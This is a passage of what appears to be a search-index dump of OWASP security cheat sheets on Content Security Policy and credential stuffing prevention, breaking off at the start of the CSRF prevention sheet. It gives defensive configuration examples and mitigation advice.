type. The element's resource need to match the declared type. sandbox restricts a page's actions such as submitting forms. Only applies when used with the request header Content-Security-Policy . Not specifying a value for the directive activates all of the sandbox restrictions. Content-Security-Policy: sandbox; Sandbox syntax Navigation Directives \u00b6 Navigation directives instruct the browser about the locations that the document can navigate to. navigate-to restricts the URLs which a document can navigate to by any mean. form-action restricts the URLs which the forms can submit to. frame-ancestors restricts the URLs that can embed the requested resource inside of <frame> , <iframe> , <object> , <embed> , or <applet> elements. If this directive is specified in a <meta> tag, the directive is ignored. This directive doesn't fallback to default-src directive. X-Frame-Options is rendered obsolete by this directive and is ignored by the user agents. Reporting Directives \u00b6 Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives. report-to which is a groupname defined in the header in a json formatted header value. MDN report-to documentation report-uri directive is deprecated by report-to , which is a URI that the reports are sent to. Goes by the format of: Content-Security-Policy: report-uri https://example.com/csp-reports In order to ensure backward compatibility, use the 2 directives in conjunction. Whenever a browser supports report-to , it will ignore report-uri . Otherwise, report-uri will be used. Special Directive Sources \u00b6 Value Description 'none' No URLs match. 'self' Refers to the origin site with the same scheme and port number. 'unsafe-inline' Allows the usage of inline scripts or styles. 'unsafe-eval' Allows the usage of eval in scripts. 'strict-dynamic' Informs the browser to trust scripts originating from a root trusted script. Note: strict-dynamic is not a standalone directive and should be used in combination with other directive values, such as nonce , hashes , etc. In case where the developer needs to use inline scripts, it's recommended to use hashes for static scripts or a nonce on every page request. To create hashes, check out this hash generator . This is a great example of using hashes. To better understand how the directive sources work, check out the source lists from w3c . Nonces \u00b6 Nonces attributes are added to script tags. Nonce attributes are composed of base64 values. This nonce is verified against the nonce sent in the CSP header, and only matching nonces are allowed to execute. They can be used in dynamic script blocks in combination with strict-dynamic . If the script block is creating additional DOM elements and executing JS inside of them, strict-dynamic tells the browser to trust those elements. For more details on strict-dynamic, check out strict-dynamic usage . CSP Sample Policies \u00b6 Basic CSP Policy \u00b6 This policy will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute. If your application functions with these restrictions, it drastically reduces your attack surface, and works with most modern browsers. The most basic policy assumes: All resources are hosted by the same domain of the document. There are no inlines or evals for scripts and style resources. Content-Security-Policy: default-src 'self'; To tighten further, one can apply the following: Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; This policy allows images, scripts, AJAX, and CSS from the same origin, and does not allow any other resources to load (eg. object, frame, media, etc). Mixed Content Policy \u00b6 In order to prevent mixed content (resources being loaded over http, from a document loaded over https), one can use the block-all-mixed-content directive to block mixed content. Content-Security-Policy: block-all-mixed-content; On the other hand, if the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP: Content-Security-Policy: upgrade-insecure-requests; If the upgrade-insecure-requests is set, the block-all-mixed-content is rendered meaningless and should be removed. Preventing ClickJacking \u00b6 To prevent all framing of your content use: Content-Security-Policy: frame-ancestors 'none'; To allow for the site itself, use: Content-Security-Policy: frame-ancestors 'self'; To allow for trusted domain, do the following: Content-Security-Policy: frame-ancestors trusted.com; Strict Policy \u00b6 A strict policy's role is to protect against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP. Google went ahead and set up a guide to adopt a strict CSP based on nonces. Based on a presentation at LocoMocoSec, the following two policies can be used to apply a strict policy: Moderate Strict Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'; Locked down Strict Policy: script-src 'nonce-r4nd0m'; object-src 'none'; base-uri 'none'; Refactoring inline code \u00b6 By default CSP disables any unsigned JavaScript code placed inline in the HTML source, such as this: < script > var foo = \"314\" < script > The inline code can be enabled by specifying its SHA256 hash in the CSP header: Content-Security-Policy: script-src 'sha256-gPMJwWBMWDx0Cm7ZygJKZIU2vZpiYvzUQjl5Rh37hKs='; This particular script's hash can be calculated using the following command: echo -n 'var foo = \"314\"' | openssl sha256 -binary | openssl base64 Some browsers (e.g. Chrome) will also display the hash of the script in JavaScript console warning when blocking an unsigned script. The inline code can be also simply moved to a separate JavaScript file and the code in the page becomes: < script src = \"app.js\" > < /script> With app.js containing the var foo = \"314\" code. The inline code restriction also applies to inline event handlers , so that the following construct will be blocked under CSP: < button id = \"button1\" onclick = \"doSomething()\" > This should be replaced by addEventListener calls: document . getElementById ( \"button1\" ). addEventListener ( 'click' , doSomething ); References \u00b6 CSP with Google CSP Level 3 W3C Content-Security-Policy MDN CSP CSP CheatSheet by Scott Helme Breaking Bad CSP CSP A Successful Mess Between Hardening And Mitigation","title":"Content Security Policy"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#content-security-policy-cheat-sheet","text":"","title":"Content Security Policy Cheat Sheet"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#introduction","text":"This article brings forth a way to integrate the defense in depth concept to the client-side of web applications. By injecting the Content-Security-Policy (CSP) headers from the server, the browser is aware and capable of protecting the user from dynamic calls that will load content into the page currently being visited.","title":"Introduction"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#context","text":"The increase in XSS and clickjacking vulnerabilities demands a more defense in depth security approach. CSP comes in place to enforce the loading of resources (scripts, images, etc.) from restricted locations that are trusted by the server, as well as enforcing HTTPS usage transparently. Moreover, the developer will get more visibility on the attacks occurring on the application by using the CSP reporting directive.","title":"Context"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#defense-in-depth","text":"A strong CSP provides an effective second layer of protection against various types of vulnerabilities, including XSS. Although it may not be possible to fully mitigate these issues, a CSP can make it significantly harder for an attacker to actually exploit them. Even on a fully static website, which does not accept any user input, a CSP can be used to enforce the use of Subresource Integrity (SRI) . This can help prevent malicious code being loaded on the website if one of the third party sites hosting JavaScript files (such as analytics scripts) is compromised. However, CSP should not be relied upon as the only defensive mechanism on a website. It is still vital that other protective controls are implemented, such as those discussed in the Cross-Site Scripting Prevention Cheat Sheet .","title":"Defense in Depth"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#policy-delivery","text":"CSP can be delivered to the user agent in different techniques. Content-Security-Policy HTTP response header field. This is the most preferred technique. <meta> HTML element with http-equiv attribute set to Content-Security-Policy . These elements need to be placed as early as possible in the documents. Content-Security-Policy-Report-Only HTTP response header field. This header is used when the developer is unsure of the CSP behavior and wants to monitor it, instead of enforcing it.","title":"Policy Delivery"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#http-headers","text":"The following are headers for CSP. Content-Security-Policy : W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+ Content-Security-Policy-Report-Only : W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking (\"fail open\") and a report is sent to the URL designated by the report-uri directive. This is often used as a precursor to utilizing CSP in blocking mode (\"fail closed\") DO NOT use X-Content-Security-Policy or X-WebKit-CSP. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.","title":"HTTP Headers"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#csp-directives","text":"Multiple types of directives exist that allow the developer to granularly control the flow of the policies.","title":"CSP Directives"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#fetch-directives","text":"Fetch directives tell the browser the locations to trust and load resources from. Most fetch directives have a certain fallback list specified in w3 . This list allows for granular control of the source of scripts, images, files, etc. child-src allows the developer to control nested browsing contexts and worker execution contexts. According to MDN , the below 2 directives should be used to regulate nested browsing context and workers as child-src will be deprecated in the coming versions. frame-src specifies the URLs which can be loaded into nested browsing contexts ( e.g. <iframe> ). worker-src specifies the URLs which can be loaded as worker, sharedworker, or serviceworker. Fallback's on script-src too. connect-src provides control over fetch requests, XHR, eventsource, beacon and websockets connections. font-src specifies which URLs to load fonts from. img-src specifies the URLs that images can be loaded from. manifest-src specifies the URLs that application manifests may be loaded from. media-src specifies the URLs from which video, audio and text track resources can be loaded from. prefetch-src specifies the URLs from which resources can be prefetched from. object-src specifies the URLs from which plugins can be loaded from. script-src specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives. script-src-elem controls the location from which execution of script requests and blocks can occur. script-src-attr controls the execution of event handlers. style-src controls from where styles get applied to a document. This includes <link> elements, @import rules, and requests originating from a Link HTTP response header field. style-src-elem controls styles except for inline attributes. style-src-attr controls styles attributes. default-src is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of default-src .","title":"Fetch Directives"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#document-directives","text":"Document directives instruct the browser about the properties of the document to which the policies will apply to. base-uri specifies the possible URLs that the <base> element can use. plugin-types limits the types of resources that can be loaded into the document ( e.g. application/pdf). 3 rules apply to the affected elements, <embed> and <object> : The element needs to explicitly declare its type. The element's type needs to match the declared type. The element's resource need to match the declared type. sandbox restricts a page's actions such as submitting forms. Only applies when used with the request header Content-Security-Policy . Not specifying a value for the directive activates all of the sandbox restrictions. Content-Security-Policy: sandbox; Sandbox syntax","title":"Document Directives"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#navigation-directives","text":"Navigation directives instruct the browser about the locations that the document can navigate to. navigate-to restricts the URLs which a document can navigate to by any mean. form-action restricts the URLs which the forms can submit to. frame-ancestors restricts the URLs that can embed the requested resource inside of <frame> , <iframe> , <object> , <embed> , or <applet> elements. If this directive is specified in a <meta> tag, the directive is ignored. This directive doesn't fallback to default-src directive. X-Frame-Options is rendered obsolete by this directive and is ignored by the user agents.","title":"Navigation Directives"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#reporting-directives","text":"Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives. report-to which is a groupname defined in the header in a json formatted header value. MDN report-to documentation report-uri directive is deprecated by report-to , which is a URI that the reports are sent to. Goes by the format of: Content-Security-Policy: report-uri https://example.com/csp-reports In order to ensure backward compatibility, use the 2 directives in conjunction. Whenever a browser supports report-to , it will ignore report-uri . Otherwise, report-uri will be used.","title":"Reporting Directives"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#special-directive-sources","text":"Value Description 'none' No URLs match. 'self' Refers to the origin site with the same scheme and port number. 'unsafe-inline' Allows the usage of inline scripts or styles. 'unsafe-eval' Allows the usage of eval in scripts. 'strict-dynamic' Informs the browser to trust scripts originating from a root trusted script. Note: strict-dynamic is not a standalone directive and should be used in combination with other directive values, such as nonce , hashes , etc. In case where the developer needs to use inline scripts, it's recommended to use hashes for static scripts or a nonce on every page request. To create hashes, check out this hash generator . This is a great example of using hashes. To better understand how the directive sources work, check out the source lists from w3c .","title":"Special Directive Sources"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#nonces","text":"Nonces attributes are added to script tags. Nonce attributes are composed of base64 values. This nonce is verified against the nonce sent in the CSP header, and only matching nonces are allowed to execute. They can be used in dynamic script blocks in combination with strict-dynamic . If the script block is creating additional DOM elements and executing JS inside of them, strict-dynamic tells the browser to trust those elements. For more details on strict-dynamic, check out strict-dynamic usage .","title":"Nonces"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#csp-sample-policies","text":"","title":"CSP Sample Policies"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#basic-csp-policy","text":"This policy will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute. If your application functions with these restrictions, it drastically reduces your attack surface, and works with most modern browsers. The most basic policy assumes: All resources are hosted by the same domain of the document. There are no inlines or evals for scripts and style resources. Content-Security-Policy: default-src 'self'; To tighten further, one can apply the following: Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; This policy allows images, scripts, AJAX, and CSS from the same origin, and does not allow any other resources to load (eg. object, frame, media, etc).","title":"Basic CSP Policy"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#mixed-content-policy","text":"In order to prevent mixed content (resources being loaded over http, from a document loaded over https), one can use the block-all-mixed-content directive to block mixed content. Content-Security-Policy: block-all-mixed-content; On the other hand, if the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP: Content-Security-Policy: upgrade-insecure-requests; If the upgrade-insecure-requests is set, the block-all-mixed-content is rendered meaningless and should be removed.","title":"Mixed Content Policy"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#preventing-clickjacking","text":"To prevent all framing of your content use: Content-Security-Policy: frame-ancestors 'none'; To allow for the site itself, use: Content-Security-Policy: frame-ancestors 'self'; To allow for trusted domain, do the following: Content-Security-Policy: frame-ancestors trusted.com;","title":"Preventing ClickJacking"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#strict-policy","text":"A strict policy's role is to protect against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP. Google went ahead and set up a guide to adopt a strict CSP based on nonces. Based on a presentation at LocoMocoSec, the following two policies can be used to apply a strict policy: Moderate Strict Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'; Locked down Strict Policy: script-src 'nonce-r4nd0m'; object-src 'none'; base-uri 'none';","title":"Strict Policy"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#refactoring-inline-code","text":"By default CSP disables any unsigned JavaScript code placed inline in the HTML source, such as this: < script > var foo = \"314\" < script > The inline code can be enabled by specifying its SHA256 hash in the CSP header: Content-Security-Policy: script-src 'sha256-gPMJwWBMWDx0Cm7ZygJKZIU2vZpiYvzUQjl5Rh37hKs='; This particular script's hash can be calculated using the following command: echo -n 'var foo = \"314\"' | openssl sha256 -binary | openssl base64 Some browsers (e.g. Chrome) will also display the hash of the script in JavaScript console warning when blocking an unsigned script. The inline code can be also simply moved to a separate JavaScript file and the code in the page becomes: < script src = \"app.js\" > < /script> With app.js containing the var foo = \"314\" code. The inline code restriction also applies to inline event handlers , so that the following construct will be blocked under CSP: < button id = \"button1\" onclick = \"doSomething()\" > This should be replaced by addEventListener calls: document . getElementById ( \"button1\" ). addEventListener ( 'click' , doSomething );","title":"Refactoring inline code"},{"location":"cheatsheets/Content_Security_Policy_Cheat_Sheet.html#references","text":"CSP with Google CSP Level 3 W3C Content-Security-Policy MDN CSP CSP CheatSheet by Scott Helme Breaking Bad CSP CSP A Successful Mess Between Hardening And Mitigation","title":"References"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html","text":"Credential Stuffing Prevention Cheat Sheet \u00b6 Introduction \u00b6 This cheatsheet covers defences against two common types of authentication-related attacks: credential stuffing and password spraying. Although these are separate, distinct attacks, in many cases the defences that would be implemented to protect against them are the same, and they would also be effective at protecting against brute-force attacks. A summary of these different attacks is listed below: Attack Type Description Brute Force Testing multiple passwords from dictionary or other source against a single account. Credential Stuffing Testing username/password pairs obtained from the breach of another site. Password Spraying Testing a single weak password against a large number of different accounts. Multi-Factor Authentication \u00b6 Multi-factor authentication (MFA) is by far the best defense against the majority of password-related attacks, including credential stuffing and password spraying, with analysis by Microsoft suggesting that it would have stopped 99.9% of account compromises . As such, it should be implemented wherever possible; however, depending on the audience of the application, it may not be practical or feasible to enforce the use of MFA. In order to balance security and usability, multi-factor authentication can be combined with other techniques to require for 2nd factor only in specific circumstances where there is reason to suspect that the login attempt may not be legitimate, such as a login from: A new browser/device or IP address. An unusual country or location. Specific countries that are considered untrusted. An IP address that appears on known blacklists. An IP address that has tried to login to multiple accounts. A login attempt that appears to be scripted rather than manual. Additionally, for enterprise applications, known trusted IP ranges could be added to a whitelist so that MFA is not required when users connect from these ranges. Alternative Defenses \u00b6 Where it is not possible to implement MFA, there are many alternative defenses that can be used to protect against credential stuffing and password spraying. In isolation none of these are as effective as MFA, however if multiple defenses are implemented in a layered approach, they can provide a reasonable degree of protection. In many cases, these mechanisms will also protect against brute-force or password spraying attacks. Where an application has multiple user roles, it may be appropriate to implement different defenses for different roles. For example, it may not be feasible to enforce MFA for all users, but it should be possible to require that all administrators use it. Secondary Passwords, PINs and Security Questions \u00b6 As well as requiring a user to enter their password when authenticating, they can also be prompted to provide additional security information such as: A PIN Specific characters from a secondary passwords or memorable word Answers to security questions It must be emphasised that this does not constitute multi-factor authentication (as both factors are the same - something you know). However, it can still provide a useful layer of protection against both credential stuffing and password spraying where proper MFA can't be implemented. CAPTCHA \u00b6 Requiring a user to solve a CAPTCHA for each login attempt can help to prevent automated login attempts, which would significantly slow down a credential stuffing or password spraying attack. However, CAPTCHAs are not perfect, and in many cases tools exist that can be used to break them with a reasonably high success rate. To improve usability, it may be desirable to only require the user solve a CAPTCHA when the login request is considered suspicious, using the same criteria discussed above. IP Blacklisting \u00b6 Less sophisticated attacks will often use a relatively small number of IP addresses, which can be blacklisted after a number of failed login attempts. These failures should be tracked separately to the per-user failures, which are intended to protect against brute-force attacks. The blacklist should be temporary, in order to reduce the likelihood of permanently blocking legitimate users. Additionally, there are publicly available blacklists of known bad IP addresses which are collected by websites such as AbuseIPDB based on abuse reports from users. Consider storing the last IP address which successfully logged in to each account, and if this IP address is added to a blacklist, then taking appropriate action such as locking the account and notifying the user, as it likely that their account has been compromised. Device Fingerprinting \u00b6 Aside from the IP address, there are a number of different factors that can be used to attempt to fingerprint a device. Some of these can be obtained passively by the server from the HTTP headers (particularly the \"User-Agent\" header), including: Operating system Browser Language Using JavaScript it is possible to access far more information, such as: Screen resolution Installed fonts Installed browser plugins Using these various attributes, it is possible to create a fingerprint of the device. This fingerprint can then be matched against any browser attempting to login to the account, and if it doesn't match then the user can be prompted for additional authentication. Many users will have multiple devices or browsers that they use, so it is not practical to block attempts that do not match the existing fingerprints. The fingerprintjs2 JavaScript library can be used to carry out client-side fingerprinting. It should be noted that as all this information is provided by the client, it can potentially be spoofed by an attacker. In some cases spoofing these attributes is trivial (such as the \"User-Agent\") header, but in other cases it may be more difficult to modify these attributes. Require Unpredictable Usernames \u00b6 Credential stuffing attacks rely on not just the re-use of passwords between multiple sites, but also the re-use of usernames. A significant number of websites use the email address as the username, and as most users will have a single email address they use for all their accounts, this makes the combination of an email address and password very effective for credential stuffing attacks. Requiring users to create their own username when registering on the website makes it harder for an attacker to obtain valid username and password pairs for credential stuffing, as many of the available credential lists only include email addresses. Providing the user with a generated username can provide a higher degree of protection (as users are likely to choose the same username on most websites), but is user friendly. Additionally, care needs to be taken to ensure that the generated username is not predictable (such as being based on the user's full name, or sequential numeric IDs), as this could make enumerating valid usernames for a password spraying attack easier. Defense in Depth \u00b6 The following mechanisms are not sufficient to prevent credential stuffing or password spraying attacks; however they can be used to make the attacks more time consuming or technically difficult to implement. This can be useful to defend against opportunistic attackers, who use off-the-shelf tools and are likely to be discouraged by any technical barriers, but will not be sufficient against a more targeted attack. Multi-Step Login Processes \u00b6 The majority of off-the-shelf tools are designed for a single step login process, where the credentials are POSTed to the server, and the response indicates whether or not the login attempt was successful. By adding additional steps to this process, such as requiring the username and password to be entered sequentially, or requiring that the user first obtains a random CSRF Token before they can login, this makes the attack slightly more difficult to perform, and doubles the number of requests that the attacker must make. Require JavaScript and Block Headless Browsers \u00b6 Most tools used for these types of attacks will make direct POST requests to the server and read the responses, but will not download or execute JavaScript that was contained in them. By requiring the attacker to evaluate JavaScript in the response (for example to generate a valid token that must be submitted with the request), this forces the attacker to either use a real browser with an automation framework like Selenium or Headless Chrome, or to implement JavaScript parsing with another tool such as PhantomJS. Additionally, there are a number of techniques that can be used to identify Headless Chrome or PhantomJS . Please note that blocking visitors who have JavaScript disabled will reduce the accessibility of the website, especially to visitors who use screen readers. In certain jurisdictions this may be in breach of equalities legislation. Identifying Leaked Password \u00b6 When a user sets a new password on the application, as well as checking it against a list of known weak passwords, it can also be checked against passwords that have previously been breached. The most well known public service for this is Pwned Passwords . You can host a copy the application yourself, or use the API . In order to protect the value of the source password being searched for, Pwned Passwords implements a k-Anonymity model that allows a password to be searched for by partial hash. This allows the first 5 characters of a SHA-1 password hash to be passed to the API. Notify users about unusual security events \u00b6 When suspicious or unusual activity is detected, it may be appropriate to notify or warn the user. However, care should be taken that the user does not get overwhelmed with a large number of notifications that are not important to them, or they will just start to ignore or delete them. For example, it would generally not be appropriate to notify a user that there had been an attempt to login to their account with an incorrect password. However, if there had been a login with the correct password, but which had then failed the subsequent MFA check, the user should be notified so that they can change their password. Details related to current or recent logins should also be made visible to the user. For example, when they login to the application, the date, time and location of their previous login attempt could be displayed to them. Additionally, if the application supports concurrent sessions, the user should be able to view a list of all active sessions, and to terminate any other sessions that are not legitimate. References \u00b6 OWASP Credential Stuffing Article OWASP Automated Threats to Web Applications Project: OAT-008 Credential Stuffing , which is one of 20 defined threats in the OWASP Automated Threat Handbook this project produced.","title":"Credential Stuffing Prevention"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#credential-stuffing-prevention-cheat-sheet","text":"","title":"Credential Stuffing Prevention Cheat Sheet"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#introduction","text":"This cheatsheet covers defences against two common types of authentication-related attacks: credential stuffing and password spraying. Although these are separate, distinct attacks, in many cases the defences that would be implemented to protect against them are the same, and they would also be effective at protecting against brute-force attacks. A summary of these different attacks is listed below: Attack Type Description Brute Force Testing multiple passwords from dictionary or other source against a single account. Credential Stuffing Testing username/password pairs obtained from the breach of another site. Password Spraying Testing a single weak password against a large number of different accounts.","title":"Introduction"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#multi-factor-authentication","text":"Multi-factor authentication (MFA) is by far the best defense against the majority of password-related attacks, including credential stuffing and password spraying, with analysis by Microsoft suggesting that it would have stopped 99.9% of account compromises . As such, it should be implemented wherever possible; however, depending on the audience of the application, it may not be practical or feasible to enforce the use of MFA. In order to balance security and usability, multi-factor authentication can be combined with other techniques to require for 2nd factor only in specific circumstances where there is reason to suspect that the login attempt may not be legitimate, such as a login from: A new browser/device or IP address. An unusual country or location. Specific countries that are considered untrusted. An IP address that appears on known blacklists. An IP address that has tried to login to multiple accounts. A login attempt that appears to be scripted rather than manual. Additionally, for enterprise applications, known trusted IP ranges could be added to a whitelist so that MFA is not required when users connect from these ranges.","title":"Multi-Factor Authentication"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#alternative-defenses","text":"Where it is not possible to implement MFA, there are many alternative defenses that can be used to protect against credential stuffing and password spraying. In isolation none of these are as effective as MFA, however if multiple defenses are implemented in a layered approach, they can provide a reasonable degree of protection. In many cases, these mechanisms will also protect against brute-force or password spraying attacks. Where an application has multiple user roles, it may be appropriate to implement different defenses for different roles. For example, it may not be feasible to enforce MFA for all users, but it should be possible to require that all administrators use it.","title":"Alternative Defenses"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#secondary-passwords-pins-and-security-questions","text":"As well as requiring a user to enter their password when authenticating, they can also be prompted to provide additional security information such as: A PIN Specific characters from a secondary passwords or memorable word Answers to security questions It must be emphasised that this does not constitute multi-factor authentication (as both factors are the same - something you know). However, it can still provide a useful layer of protection against both credential stuffing and password spraying where proper MFA can't be implemented.","title":"Secondary Passwords, PINs and Security Questions"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#captcha","text":"Requiring a user to solve a CAPTCHA for each login attempt can help to prevent automated login attempts, which would significantly slow down a credential stuffing or password spraying attack. However, CAPTCHAs are not perfect, and in many cases tools exist that can be used to break them with a reasonably high success rate. To improve usability, it may be desirable to only require the user solve a CAPTCHA when the login request is considered suspicious, using the same criteria discussed above.","title":"CAPTCHA"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#ip-blacklisting","text":"Less sophisticated attacks will often use a relatively small number of IP addresses, which can be blacklisted after a number of failed login attempts. These failures should be tracked separately to the per-user failures, which are intended to protect against brute-force attacks. The blacklist should be temporary, in order to reduce the likelihood of permanently blocking legitimate users. Additionally, there are publicly available blacklists of known bad IP addresses which are collected by websites such as AbuseIPDB based on abuse reports from users. Consider storing the last IP address which successfully logged in to each account, and if this IP address is added to a blacklist, then taking appropriate action such as locking the account and notifying the user, as it likely that their account has been compromised.","title":"IP Blacklisting"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#device-fingerprinting","text":"Aside from the IP address, there are a number of different factors that can be used to attempt to fingerprint a device. Some of these can be obtained passively by the server from the HTTP headers (particularly the \"User-Agent\" header), including: Operating system Browser Language Using JavaScript it is possible to access far more information, such as: Screen resolution Installed fonts Installed browser plugins Using these various attributes, it is possible to create a fingerprint of the device. This fingerprint can then be matched against any browser attempting to login to the account, and if it doesn't match then the user can be prompted for additional authentication. Many users will have multiple devices or browsers that they use, so it is not practical to block attempts that do not match the existing fingerprints. The fingerprintjs2 JavaScript library can be used to carry out client-side fingerprinting. It should be noted that as all this information is provided by the client, it can potentially be spoofed by an attacker. In some cases spoofing these attributes is trivial (such as the \"User-Agent\") header, but in other cases it may be more difficult to modify these attributes.","title":"Device Fingerprinting"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#require-unpredictable-usernames","text":"Credential stuffing attacks rely on not just the re-use of passwords between multiple sites, but also the re-use of usernames. A significant number of websites use the email address as the username, and as most users will have a single email address they use for all their accounts, this makes the combination of an email address and password very effective for credential stuffing attacks. Requiring users to create their own username when registering on the website makes it harder for an attacker to obtain valid username and password pairs for credential stuffing, as many of the available credential lists only include email addresses. Providing the user with a generated username can provide a higher degree of protection (as users are likely to choose the same username on most websites), but is user friendly. Additionally, care needs to be taken to ensure that the generated username is not predictable (such as being based on the user's full name, or sequential numeric IDs), as this could make enumerating valid usernames for a password spraying attack easier.","title":"Require Unpredictable Usernames"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#defense-in-depth","text":"The following mechanisms are not sufficient to prevent credential stuffing or password spraying attacks; however they can be used to make the attacks more time consuming or technically difficult to implement. This can be useful to defend against opportunistic attackers, who use off-the-shelf tools and are likely to be discouraged by any technical barriers, but will not be sufficient against a more targeted attack.","title":"Defense in Depth"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#multi-step-login-processes","text":"The majority of off-the-shelf tools are designed for a single step login process, where the credentials are POSTed to the server, and the response indicates whether or not the login attempt was successful. By adding additional steps to this process, such as requiring the username and password to be entered sequentially, or requiring that the user first obtains a random CSRF Token before they can login, this makes the attack slightly more difficult to perform, and doubles the number of requests that the attacker must make.","title":"Multi-Step Login Processes"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#require-javascript-and-block-headless-browsers","text":"Most tools used for these types of attacks will make direct POST requests to the server and read the responses, but will not download or execute JavaScript that was contained in them. By requiring the attacker to evaluate JavaScript in the response (for example to generate a valid token that must be submitted with the request), this forces the attacker to either use a real browser with an automation framework like Selenium or Headless Chrome, or to implement JavaScript parsing with another tool such as PhantomJS. Additionally, there are a number of techniques that can be used to identify Headless Chrome or PhantomJS . Please note that blocking visitors who have JavaScript disabled will reduce the accessibility of the website, especially to visitors who use screen readers. In certain jurisdictions this may be in breach of equalities legislation.","title":"Require JavaScript and Block Headless Browsers"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#identifying-leaked-password","text":"When a user sets a new password on the application, as well as checking it against a list of known weak passwords, it can also be checked against passwords that have previously been breached. The most well known public service for this is Pwned Passwords . You can host a copy the application yourself, or use the API . In order to protect the value of the source password being searched for, Pwned Passwords implements a k-Anonymity model that allows a password to be searched for by partial hash. This allows the first 5 characters of a SHA-1 password hash to be passed to the API.","title":"Identifying Leaked Password"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#notify-users-about-unusual-security-events","text":"When suspicious or unusual activity is detected, it may be appropriate to notify or warn the user. However, care should be taken that the user does not get overwhelmed with a large number of notifications that are not important to them, or they will just start to ignore or delete them. For example, it would generally not be appropriate to notify a user that there had been an attempt to login to their account with an incorrect password. However, if there had been a login with the correct password, but which had then failed the subsequent MFA check, the user should be notified so that they can change their password. Details related to current or recent logins should also be made visible to the user. For example, when they login to the application, the date, time and location of their previous login attempt could be displayed to them. Additionally, if the application supports concurrent sessions, the user should be able to view a list of all active sessions, and to terminate any other sessions that are not legitimate.","title":"Notify users about unusual security events"},{"location":"cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#references","text":"OWASP Credential Stuffing Article OWASP Automated Threats to Web Applications Project: OAT-008 Credential Stuffing , which is one of 20 defined threats in the OWASP Automated Threat Handbook this project produced.","title":"References"},{"location":"cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html","text":"Cross-Site Request Forgery Prevention Cheat Sheet \u00b6 Introduction \u00b6 Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user's web browser to perform an unwanted action on a trusted site when the user is authenticated. A CSRF attack works because browser requests automatically include all cookies including session cookies. Therefore, if the user is authenticated to the site, the site cannot distinguish between legitimate requests and forged requests. The impact of a successful CSRF attack is limited to the capabilities exposed by the vulnerable application and privileges of the user. For example, this attack could result in a transfer of funds, changing a password, or making a purchase with the user's credentials. In effect, CSRF attacks are used by an attacker to make a target system perform a function via the victim's browser, without the victim's knowledge, at least until the unauthorized transaction has been committed. In short, the following principles should be followed to defend against CSRF: Check if your framework has built-in CSRF protection and use it If framework does not have built-in CSRF protection add CSRF tokens to all state changing requests (requests that cause actions on the site) and validate them on backend Always use SameSite Cookie Attribute for session cookies Implement at least one mitigation from Defense in Depth Mitigations section Use custom request headers Verify the origin with standard headers Use double submit cookies Consider implementing user interaction based protection for highly sensitive operations Remember that any Cross-Site Scripting (XSS) can be used to defeat all CSRF mitigation techniques! See the OWASP XSS 